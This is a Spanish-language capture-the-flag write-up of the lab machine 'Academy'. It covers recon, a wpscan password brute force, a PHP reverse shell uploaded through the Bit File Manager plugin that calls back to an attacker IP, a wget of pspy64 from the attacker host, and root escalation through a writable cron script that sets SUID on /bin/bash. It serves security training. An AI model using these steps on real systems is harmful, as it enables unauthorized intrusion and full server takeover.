# 🖥️ Academy

```bash
┌──(Harou㉿kali)-[~/writeups/academy]
└─$ cat info.txt
  Plataforma  : The Hackers Labs
  Dificultad  : 🟢 Fácil
  Sistema     : Linux
  Fecha       : 26/03/2026
  Estado      : ✅ Completada
```

---

## 🎯 `cat objetivo.txt`

> Máquina Linux con un WordPress vulnerable. El objetivo es conseguir acceso inicial a través de un plugin de gestión de archivos y escalar privilegios hasta root abusando de una tarea cron mal configurada.

---

## 🔍 `./reconnaissance.sh`

### Escaneo de puertos

```bash
nmap -p- -sS -sCV --open --min-rate=5000 -n -vvv 192.168.0.104 -oN escaneo.txt
```

**Resultado:**

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
```

**Puertos abiertos:**

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22 | SSH | OpenSSH 9.2p1 |
| 80 | HTTP | Apache 2.4.59 |

---

## 🕵️ `./enumeration.sh`

### Fuzzing de directorios

El puerto 80 mostraba la página por defecto de Apache. Lanzamos Gobuster para descubrir directorios ocultos:

```bash
gobuster dir -u http://192.168.0.104 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak
```

**Hallazgo clave:** directorio `/wordpress/` con redirección 301.

### Virtual Hosting

Al intentar acceder a `http://192.168.0.104/wordpress/` el servidor devolvía un error. Mediante las cabeceras HTTP descubrimos el dominio real:

```bash
curl -I http://192.168.0.104/wordpress/
# Link: <http://academy.thl/wordpress/index.php/wp-json/>
```

Añadimos el dominio al `/etc/hosts`:

```bash
echo "192.168.0.104 academy.thl" | sudo tee -a /etc/hosts
```

### Enumeración WordPress con WPScan

```bash
wpscan --url http://academy.thl/wordpress/ --enumerate u,vp --plugins-detection aggressive
```

**Hallazgos:**
- Usuario identificado: `dylan`
- Plugin activo: **Bit File Manager 6.5.1**
- Upload directory con listing habilitado

### Fuerza bruta de credenciales

```bash
wpscan --url http://academy.thl/wordpress/ --usernames dylan --passwords /usr/share/wordlists/rockyou.txt --max-threads 50
```

**Credenciales obtenidas:** `dylan : password1`

---

## ⚡ `./exploitation.sh`

### Acceso inicial — Reverse Shell via Bit File Manager

Con credenciales válidas accedimos al panel `wp-admin`. El plugin **Bit File Manager** permite subir archivos directamente al servidor.

Preparamos la reverse shell de PentestMonkey:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php /home/kali/shell.php
# Editar: $ip = '192.168.0.21'; $port = 4444;
```

Pusimos netcat a escuchar:

```bash
nc -lvnp 4444
```

Subimos `shell.php` a `wp-content/uploads/` mediante el plugin y accedimos a:

```
http://academy.thl/wordpress/wp-content/uploads/shell.php
```

Recibimos la conexión como `www-data` y estabilizamos la shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

**¿Qué vulnerabilidad explotamos?**

```
Un plugin legítimo de gestión de archivos (Bit File Manager) con permisos
de subida sin restricción de tipo de archivo. Esto permitió subir un archivo
PHP malicioso que el servidor ejecutó al acceder a su URL.
```

---

## 🚀 `./privesc.sh`

### Escalada de privilegios — Cron Job Abuse + SUID Bash

Transferimos **pspy64** a la máquina víctima para monitorizar procesos:

```bash
# En Kali
cd /home/kali && python3 -m http.server 8080

# En la shell de www-data
cd /tmp
wget http://192.168.0.21:8080/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64
```

**Hallazgo crítico:**

```
UID=0  PID=2271  | /bin/sh -c /opt/backup.sh
```

Root ejecutaba `/opt/backup.sh` cada minuto. El directorio `/opt` era propiedad de `www-data`, por lo que podíamos crear ese archivo.

Además, en `/opt/backup.py` encontramos credenciales en texto plano:

```python
username = "dylan"
password = "dylan123"
```

Creamos el script malicioso que root ejecutaría automáticamente:

```bash
echo 'chmod 4777 /bin/bash' > /opt/backup.sh
chmod +x /opt/backup.sh
```

Tras esperar un minuto verificamos el resultado:

```bash
ls -la /bin/bash
# -rwsrwxrwx 1 root root — la 's' confirma el SUID activado
```

Ejecutamos bash con privilegios de root:

```bash
/bin/bash -p
whoami
# root
```

---

## 🏁 `cat flags.txt`

```
User flag  : ****************************
Root flag  : ****************************
```

---

## 🧠 `cat lecciones.txt`

- 💡 **Virtual Hosting:** WordPress y otras aplicaciones web pueden estar configuradas con un dominio en lugar de una IP. Las cabeceras HTTP (especialmente `Link` y `Location`) revelan ese dominio. Solución: añadir la entrada al `/etc/hosts`.

- 💡 **Plugins legítimos como vector de ataque:** No siempre necesitamos exploits sofisticados. Un plugin de gestión de archivos mal restringido es suficiente para comprometer un servidor. La superficie de ataque incluye las funcionalidades propias de la aplicación.

- 💡 **Credenciales en texto plano:** Encontramos usuario y contraseña directamente en un script Python dentro del servidor. Los desarrolladores frecuentemente dejan credenciales hardcodeadas en scripts de mantenimiento — siempre vale la pena revisar `/opt`, `/var`, `/srv` y similares.

- 💡 **Cron Job Abuse:** Las tareas programadas que ejecuta root son un vector clásico de escalada. Si el script que ejecuta root no existe o si su directorio padre es escribible por nosotros, podemos inyectar comandos que root ejecutará automáticamente.

- 💡 **SUID Bash:** Activar el bit SUID en `/bin/bash` permite a cualquier usuario obtener una shell con los privilegios del propietario del binario (root). Es una técnica simple pero muy efectiva cuando tenemos capacidad de escribir comandos que ejecuta root.

---

## 🛠️ `cat herramientas.txt`

```
nmap · gobuster · wpscan · netcat · pspy64 · php-reverse-shell (PentestMonkey)
```

---

<div align="center">

*`📚 Writeup educativo — The Hackers Labs`*

</div>
